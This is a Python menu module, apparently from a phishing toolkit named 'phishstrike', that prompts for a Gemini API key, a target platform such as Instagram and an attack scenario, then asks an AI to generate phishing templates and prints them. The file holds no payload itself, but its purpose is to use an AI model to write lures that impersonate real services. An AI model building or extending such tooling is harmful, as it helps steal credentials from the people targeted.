import os

from lib import ai_assistant
from lib.terminal_ui import *


def ai_assistant_menu() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    glitch_print(
        " --- AI PHISHING ASSISTANT --- ",
        duration=0.5,
        start_rgb=RGB_PINK,
        end_rgb=RGB_WHITE,
    )

    if not ai_assistant.setup_ai():
        print(f"\n    {DARK}[{WHITE}!{DARK}]{RED} Gemini API Key not found!")
        key = input(
            f"    {DARK}[{WHITE}-{DARK}]{LIGHT2} Please enter your Gemini API Key: {WHITE}"
        )
        if key:
            ai_assistant.save_api_key(key)
        else:
            from phishstrike.cli.menu import main_menu

            main_menu()
            return

    platform_name = input(
        f"\n    {DARK}[{WHITE}?{DARK}]{LIGHT2} Target Platform (e.g. Instagram): {WHITE}"
    )
    scenario = input(
        f"\n    {DARK}[{WHITE}?{DARK}]{LIGHT2} Attack Scenario "
        f"(e.g. Account Security Alert): {WHITE}"
    )

    print()
    loading_animation(4, "AI is thinking")
    result = ai_assistant.generate_templates(platform_name, scenario)

    print(
        f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
    )
    slow_type(result, speed=0.005, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
    print(
        f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
    )

    input(f"\n    {DARK}[{WHITE}Enter{DARK}]{LIGHT2} to return to main menu...")
    from phishstrike.cli.menu import main_menu

    main_menu()
